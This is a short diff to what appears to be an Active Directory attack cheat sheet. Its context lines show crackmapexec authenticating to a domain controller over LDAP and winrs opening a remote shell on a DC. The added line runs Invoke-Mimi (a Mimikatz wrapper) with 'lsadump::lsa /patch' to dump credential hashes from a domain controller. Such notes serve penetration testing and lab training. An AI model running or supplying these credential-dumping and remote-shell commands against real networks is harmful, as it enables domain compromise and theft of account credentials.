@@ -170,3 +170,5 @@ sudo crackmapexec ldap dc01.doamin.local -u 'uname' -p 'passwd' --kdcHost dc01.d
 
 
 winrs -r:us-dc.us.techcorp.local cmd
+
+Invoke-Mimi -Command '"lsadump::lsa /patch"'
